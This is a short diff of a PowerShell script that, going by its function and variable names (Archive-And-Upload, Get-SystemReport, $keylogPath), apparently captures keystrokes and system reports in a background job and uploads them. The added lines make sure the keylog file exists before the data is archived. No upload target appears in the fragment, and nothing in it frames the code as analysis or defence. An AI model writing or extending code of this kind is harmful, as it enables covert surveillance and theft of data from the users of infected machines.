@@ -110,6 +110,9 @@ Start-Job -ScriptBlock {
     }
 }
 function Archive-And-Upload {
+    if (-not (Test-Path $keylogPath)) {
+    New-Item -ItemType File -Path $keylogPath -Force | Out-Null
+    }
     try {
         $report = Get-SystemReport
         if ($report) {
